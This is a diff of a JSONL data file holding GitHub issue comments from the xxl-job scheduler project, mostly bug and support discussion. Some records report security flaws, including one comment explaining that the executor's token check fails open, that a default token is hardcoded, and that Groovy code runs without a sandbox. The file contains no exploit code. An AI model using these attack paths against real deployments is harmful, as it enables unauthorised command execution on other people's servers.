+  "title": "xxlJob调度丢失",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3948#issuecomment-4288213217",
+  "text": "调度线程阻塞、db写网络波动都会导致类似问题。有两个建议：\n1、调大调度线程配置。\n2、升级最新版本，支持调度合并写，针对高频调度针对性优化。\n3、保证与数据库网络稳定。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-21T11:37:22Z",
+    "updated_at": "2026-04-21T11:37:22Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3948_4288425497_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3948,
+  "chunk_index": 0,
+  "title": "xxlJob调度丢失",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3948#issuecomment-4288425497",
+  "text": "> 调度线程阻塞、db写网络波动都会导致类似问题。有两个建议： 1、调大调度线程配置。 2、升级最新版本，支持调度合并写，针对高频调度针对性优化。 3、保证与数据库网络稳定。\n\n现在数据库确实存在很多慢sql，主要是因为数据库负载高和log表数据过多引起的，请问这种情况有没有好的解决方案呢，有没有其它数据源可以替代mysql的，或者是否有开关可以控制是否写入log表数据。",
+  "metadata": {
+    "author": "linxlc",
+    "created_at": "2026-04-21T12:14:05Z",
+    "updated_at": "2026-04-21T12:14:05Z"
   }
 }
 {
@@ -659,6 +1184,51 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3945_4228366628_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3945,
+  "chunk_index": 0,
+  "title": "Expression injection vulnerabilities in XXL-job",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3945#issuecomment-4228366628",
+  "text": "存在access token限制，启用即可。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-11T06:44:53Z",
+    "updated_at": "2026-04-11T06:44:53Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3945_4229515585_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3945,
+  "chunk_index": 0,
+  "title": "Expression injection vulnerabilities in XXL-job",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3945#issuecomment-4229515585",
+  "text": "您好，首先，token 验证逻辑是 fail-open 设计，null/empty 时直接放行所有请求，加上 default_token 硬编码在开源仓库中，构成 CWE-1392 默认凭据问题——项目此前的 CVE-2022-36157也是针对类似情况；其次，即便 token 配置正确，攻击者也可能通过配置泄露或 SSRF 等途径拿到 token，executor 的 GroovyClassLoader 没有任何 SecureASTCustomizer 沙箱限制，可以直接执行任意系统命令。",
+  "metadata": {
+    "author": "FionaQX",
+    "created_at": "2026-04-11T13:37:25Z",
+    "updated_at": "2026-04-11T13:37:25Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3945_4229609312_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3945,
+  "chunk_index": 0,
+  "title": "Expression injection vulnerabilities in XXL-job",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3945#issuecomment-4229609312",
+  "text": "建议聚焦问题，token不泄漏前提下不会出现类似问题。回到token泄漏本身，可以横向对比redid、MySQL，建议定期轮换随机强密码。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-11T14:45:03Z",
+    "updated_at": "2026-04-11T14:45:03Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3941_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -686,6 +1256,141 @@
     "state": "closed",
     "created_at": "2026-03-30T01:25:37Z",
     "updated_at": "2026-04-26T06:13:53Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4152302229_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4152302229",
+  "text": "日志不全，贴出异常完整日志",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-30T05:21:30Z",
+    "updated_at": "2026-03-30T05:21:30Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4152374909_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4152374909",
+  "text": "这确实已经是完整的线程栈日志了 JobLogFileCleanThread.java:82",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-03-30T05:41:19Z",
+    "updated_at": "2026-03-30T05:41:19Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4152538466_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4152538466",
+  "text": "规律是每日14:10左右会触发一次",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-03-30T06:16:51Z",
+    "updated_at": "2026-03-30T06:16:51Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4152587141_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4152587141",
+  "text": "<img width=\"1653\" height=\"129\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b3389a53-6f6b-4666-9200-cbf98f95691d\" /> 顺带有个其他问题 注册都失败了，为何日志级别不是ERROR 而是info",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-03-30T06:27:56Z",
+    "updated_at": "2026-03-30T06:27:56Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4168215849_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4168215849",
+  "text": "@xuxueli 升级到最新的 多个项目都出现了这个 异常，每日一次，时间不固定，还需要提供什么，运行环境是 k8s，多pod ，JDK是17和21",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-04-01T07:48:56Z",
+    "updated_at": "2026-04-01T07:48:56Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4175934747_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4175934747",
+  "text": "![Image](https://github.com/user-attachments/assets/d719bbeb-adc4-4f07-86c8-7f0343f04dc6) 日期 下面很多个log文件，每个文件内容很少\n\n<img width=\"1599\" height=\"58\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5b21b377-1044-4259-8893-7ed6dd036282\" />",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-04-02T09:31:45Z",
+    "updated_at": "2026-04-02T09:32:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4188343501_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4188343501",
+  "text": "单个机器，是不是部署多个执行器？",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-05T05:45:50Z",
+    "updated_at": "2026-04-05T05:45:50Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4188776032_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4188776032",
+  "text": "master分支已经优化推送，将随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-05T11:57:02Z",
+    "updated_at": "2026-04-05T11:57:02Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3941_4210823660_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3941,
+  "chunk_index": 0,
+  "title": "Caused by: java.nio.file.NoSuchFileException: /logs/service-user/xxl-job/jobhandler/2026-03-21/17192646.log",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3941#issuecomment-4210823660",
+  "text": "@xuxueli 有办法通过配置 关闭客户端的日志存储么，现在每次执行 都生成一个日志文件，也没啥用",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-04-09T01:27:33Z",
+    "updated_at": "2026-04-09T01:27:33Z"
   }
 }
 {
@@ -809,6 +1514,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3938_4149938881_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3938,
+  "chunk_index": 0,
+  "title": "Default accessToken Exposes Unauthenticated Privileged OpenAPI Endpoints (xxl-job <= 3.3.2)",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3938#issuecomment-4149938881",
+  "text": "自定义token即可。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-29T11:20:43Z",
+    "updated_at": "2026-03-29T11:20:43Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3936_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -911,6 +1631,21 @@
     "state": "closed",
     "created_at": "2026-03-25T06:24:02Z",
     "updated_at": "2026-03-29T11:21:40Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3936_4149940191_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3936,
+  "chunk_index": 0,
+  "title": "IDOR in /xxl-job-admin/joblog/logDetailCat Allows Cross-Group Log Access (xxl-job <= 3.3.2)",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3936#issuecomment-4149940191",
+  "text": "存在 执行器 权限检验逻辑。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-29T11:21:37Z",
+    "updated_at": "2026-03-29T11:21:37Z"
   }
 }
 {
@@ -1034,6 +1769,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3935_4149942365_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3935,
+  "chunk_index": 0,
+  "title": "SSRF in /xxl-job-admin/jobinfo/trigger via User-Controlled addressList (xxl-job <= 3.3.2)",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3935#issuecomment-4149942365",
+  "text": "能够登录系统，默认说明存在系统权限，属于用户主动行为。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-29T11:23:04Z",
+    "updated_at": "2026-03-29T11:23:04Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3934_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1046,6 +1796,21 @@
     "state": "closed",
     "created_at": "2026-03-24T02:38:49Z",
     "updated_at": "2026-04-05T12:36:53Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3934_4149943704_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3934,
+  "chunk_index": 0,
+  "title": "任务终止导致该任务的所有任务实例都会被终止",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3934#issuecomment-4149943704",
+  "text": "终止为单任务维护，可以参考文档说明。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-29T11:23:58Z",
+    "updated_at": "2026-03-29T11:23:58Z"
   }
 }
 {
@@ -1079,6 +1844,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3932_4106289651_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3932,
+  "chunk_index": 0,
+  "title": "docker-compose 启动时报ERROR: docker.io/library/openjdk:21-jdk-slim: not found",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3932#issuecomment-4106289651",
+  "text": "Docker基础镜像调整为eclipse-temurin；\n——————\n相关代码已推送。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-22T13:48:45Z",
+    "updated_at": "2026-03-22T13:48:45Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3930_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1091,6 +1871,21 @@
     "state": "closed",
     "created_at": "2026-03-09T08:47:21Z",
     "updated_at": "2026-04-07T02:23:25Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3930_4188338250_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3930,
+  "chunk_index": 0,
+  "title": "GLUE(PowerShell)模式在windows环境下存在脚本关联日志文件编码问题",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3930#issuecomment-4188338250",
+  "text": "重复，合并至： https://github.com/xuxueli/xxl-job/issues/3921 \n——————\n\n建议提供完整复线步骤，环境、安装依赖、任务等",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-05T05:41:12Z",
+    "updated_at": "2026-04-05T05:41:12Z"
   }
 }
 {
@@ -1109,6 +1904,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3929_4012737782_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3929,
+  "chunk_index": 0,
+  "title": "Security: Authentication Bypass, Remote Code Execution, and SSRF Vulnerabilities in xxl-job Core Components",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3929#issuecomment-4012737782",
+  "text": "Withdrawing this report. We apologize for the noise — this should have been filed through proper security disclosure channels, not as a public issue. Closing.",
+  "metadata": {
+    "author": "Vext-Labs",
+    "created_at": "2026-03-06T16:30:59Z",
+    "updated_at": "2026-03-06T16:30:59Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3928_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1120,6 +1930,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-03-04T08:05:20Z",
+    "updated_at": "2026-03-22T14:09:03Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3928_4106318888_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3928,
+  "chunk_index": 0,
+  "title": "xxl-job v3.1.1 升级到 v3.3.2 版本的数据库，手动升级步骤",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3928#issuecomment-4106318888",
+  "text": "👍",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-22T14:09:03Z",
     "updated_at": "2026-03-22T14:09:03Z"
   }
 }
@@ -1136,6 +1961,36 @@
     "state": "closed",
     "created_at": "2026-03-03T10:28:47Z",
     "updated_at": "2026-03-06T17:39:58Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3927_3995877728_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3927,
+  "chunk_index": 0,
+  "title": "admin:123456怎么登入不了啊",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3927#issuecomment-3995877728",
+  "text": "我试过了 升级xxl-job版本到3.3.2也遇到了123456Md5后登录不了，是因为3.3.2的登录密码加密方式是sha-256,希望能帮到你",
+  "metadata": {
+    "author": "yinzhengju",
+    "created_at": "2026-03-04T07:52:41Z",
+    "updated_at": "2026-03-04T07:52:41Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3927_4013088031_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3927,
+  "chunk_index": 0,
+  "title": "admin:123456怎么登入不了啊",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3927#issuecomment-4013088031",
+  "text": "> 我试过了 升级xxl-job版本到3.3.2也遇到了123456Md5后登录不了，是因为3.3.2的登录密码加密方式是sha-256,希望能帮到你\n\n+1，确认是否进行过升级",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:39:55Z",
+    "updated_at": "2026-03-06T17:39:55Z"
   }
 }
 {
@@ -1304,6 +2159,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3924_4013104244_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3924,
+  "chunk_index": 0,
+  "title": "SSRF Vulnerability",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3924#issuecomment-4013104244",
+  "text": "存在accesstoken安全验证",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:43:32Z",
+    "updated_at": "2026-03-06T17:43:32Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3922_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1331,6 +2201,21 @@
     "state": "closed",
     "created_at": "2026-02-11T06:09:12Z",
     "updated_at": "2026-03-06T17:47:54Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3922_4013123288_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3922,
+  "chunk_index": 0,
+  "title": "偶现的Premature EOF",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3922#issuecomment-4013123288",
+  "text": "常见原因为中间代理/负载均衡（如nginx）在响应还没发完时因超时或策略主动断开连接，可检查中间层。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:47:51Z",
+    "updated_at": "2026-03-06T17:47:51Z"
   }
 }
 {
@@ -1394,6 +2279,111 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3921_4188827630_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 0,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4188827630",
+  "text": "无法复现，需要进一步提供完整复线环境以及操作步骤",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-05T12:37:39Z",
+    "updated_at": "2026-04-05T12:37:39Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4195941606_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 0,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4195941606",
+  "text": "#3930 \n\n系统环境：Windows中文语言环境\n\n版本：3.3.2\n\n执行器：sample-springboot\n\npowershell版本：5.1\n\n任务：\n\n- 配置：默认配置；\n\n- 脚本：默认示例：\n\n<img width=\"809\" height=\"345\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/298ee5b8-bef2-4b7d-91dd-860e40d45e56\" />\n\n\n复写ScriptJobHandler第68行ScriptUtil.markScriptFile方法代码：\n```java\n\nWindowsOSScriptUtil.markScriptFile(scriptFileName, gluesource);\n\n```\n\nWindowsOSScriptUtil类代码：\n\n```java\n\npublic class WindowsOSScriptUtil extends ScriptUtil {\n\n    public static void markScriptFile(String scriptFileName, String scriptContent) throws IOException {\n        WindowsOSFileTool.writeString(scriptFileName, scriptContent);\n    }\n}\n\n```\n\nWindowsOSFileTool类代码：\n\n```java\n\npublic class WindowsOSFileTool extends FileTool {\n    public static void writeString(String path, String content) throws IOException {\n        writeString(path, content, false, StandardCharsets.UTF_8);\n    }\n\n    public static void writeString(String path, String content, boolean append, Charset charset) throws IOExc",
+  "metadata": {
+    "author": "Funesoul",
+    "created_at": "2026-04-07T01:37:38Z",
+    "updated_at": "2026-04-18T11:58:18Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4195941606_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 1,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4195941606",
+  "text": "c static void writeString(String path, String content, boolean append, Charset charset) throws IOException {\n        AssertTool.notBlank(path, \"file path is null\");\n        if (content != null) {\n            if (charset == null) {\n                charset = StandardCharsets.UTF_8;\n            }\n\n            File file = file(path);\n            if (!exists(path)) {\n                createFile(file);\n            } else if (!isFile(file)) {\n                throw new RuntimeException(\"path(\" + path + \") is not a file\");\n            }\n\n            BufferedWriter writer = null;\n\n            try {\n                OutputStream os = new FileOutputStream(file,append);\n                writer = new BufferedWriter(new OutputStreamWriter(os, charset), 8192);\n                // 写入 UTF-8 BOM 头\n                os.write(new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF});\n                writer.write(content);\n                writer.flush();\n            } finally {\n                IOTool.close(writer);",
+  "metadata": {
+    "author": "Funesoul",
+    "created_at": "2026-04-07T01:37:38Z",
+    "updated_at": "2026-04-18T11:58:18Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4195941606_chunk_2",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 2,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4195941606",
+  "text": ";\n                writer.flush();\n            } finally {\n                IOTool.close(writer);\n            }\n\n        }\n    }\n}\n\n\n\n```\n\n执行器控制台日志：\n```\n2026-04-07 09:01:06.993 [xxl-job, EmbedServer bizThreadPool-1099595997] [INFO] XxlJobExecutor.registJobThread [] - >>>>>>>>>>> xxl-job regist JobThread success, jobId:6, handler:com.xxl.job.core.handler.impl.ScriptJobHandler@d44a052\n2026-04-07 09:02:40.621 [xxl-job, JobThread-6-1775523666993] [INFO] JobThread.run [] - >>>>>>>>>>> xxl-job JobThread stoped, hashCode:Thread[xxl-job, JobThread-6-1775523666993,10,main]\n```\n\n\n脚本执行日志：\n\n[77.log](https://github.com/user-attachments/files/26523404/77.log)\n\n<img width=\"781\" height=\"554\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/eb8533cd-5bc9-4c94-ab39-1ac6128f0685\" />\n\n前端日志(该问题可以通过重写读取日志文件时的解码规则强制读取，但可能影响是全局的，应该会影响UTF8环境下脚本的生成和执行。)：\n\n\n<img width=\"296\" height=\"199\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a50c18c0-7ba2-4b8b-82de-4e14e5291a21\" />",
+  "metadata": {
+    "author": "Funesoul",
+    "created_at": "2026-04-07T01:37:38Z",
+    "updated_at": "2026-04-18T11:58:18Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4195941606_chunk_3",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 3,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4195941606",
+  "text": "ttps://github.com/user-attachments/assets/a50c18c0-7ba2-4b8b-82de-4e14e5291a21\" />",
+  "metadata": {
+    "author": "Funesoul",
+    "created_at": "2026-04-07T01:37:38Z",
+    "updated_at": "2026-04-18T11:58:18Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4266467381_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 0,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4266467381",
+  "text": "+1, windows下即使不使用参数，也无法读取日志。应该与中文参数无关。本机日志文件中是有内容的，只是服务端读取出错。",
+  "metadata": {
+    "author": "zhaoyaohui0",
+    "created_at": "2026-04-17T08:22:39Z",
+    "updated_at": "2026-04-17T08:22:39Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3921_4750168317_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3921,
+  "chunk_index": 0,
+  "title": "GLUE(PowerShell)参数为中文的情况会导致rolling log无法查看",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3921#issuecomment-4750168317",
+  "text": "PowerShell类型GLUE任务，升级使用 PowerShell7（pwsh命令）执行，提升性能、编码兼容性以及跨平台适配性；\n（注意：对应执行器所在机器需要安装 PowerShell 7.0 及以上版本，从而支持 pwsh 命令）\n——————————\n\n升级后将会统一编码 UTF-8，解决编码问题；针对历史脚本可兼容，同时支持跨平台运行。\n代码已推送master分支，将会跟随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-19T09:09:14Z",
+    "updated_at": "2026-06-19T09:09:14Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3919_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1405,6 +2395,36 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-02-09T12:40:01Z",
+    "updated_at": "2026-03-09T04:26:12Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3919_4013200367_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3919,
+  "chunk_index": 0,
+  "title": "目前缺少 xx-job-admin 模块的性能基准数据，无法评估系统整体承载能力。请问能否提供压测脚本和流程，以便测试系统性能上限？",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3919#issuecomment-4013200367",
+  "text": "批量新建任务，正常启动运行即可。\n注意，调度性能受集群机器规模影响。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:05:14Z",
+    "updated_at": "2026-03-06T18:05:14Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3919_4021014632_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3919,
+  "chunk_index": 0,
+  "title": "目前缺少 xx-job-admin 模块的性能基准数据，无法评估系统整体承载能力。请问能否提供压测脚本和流程，以便测试系统性能上限？",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3919#issuecomment-4021014632",
+  "text": "> 正常启动\n\n现在是单节点抢锁执行调度请求，理论上来说，节点水平扩展并不能提升调度性能吧。",
+  "metadata": {
+    "author": "hezhaoye",
+    "created_at": "2026-03-09T04:26:12Z",
     "updated_at": "2026-03-09T04:26:12Z"
   }
 }
@@ -1424,6 +2444,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3918_4013138420_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3918,
+  "chunk_index": 0,
+  "title": "固定延迟支持2.5.0",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3918#issuecomment-4013138420",
+  "text": "可参考文档，支持固定间隔策略，如有诉求可定制。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:51:12Z",
+    "updated_at": "2026-03-06T17:51:12Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3917_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1436,6 +2471,21 @@
     "state": "closed",
     "created_at": "2026-02-03T09:34:47Z",
     "updated_at": "2026-03-06T17:56:08Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3917_4013155139_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3917,
+  "chunk_index": 0,
+  "title": "分片缺少强约束,是否存在 这个问题?",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3917#issuecomment-4013155139",
+  "text": "此时建议在业务逻辑内做幂等处理。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:54:55Z",
+    "updated_at": "2026-03-06T17:54:55Z"
   }
 }
 {
@@ -1454,6 +2504,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3914_4013175652_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3914,
+  "chunk_index": 0,
+  "title": "定时任务所有的任务都在增长，不会触发上限值吗？",
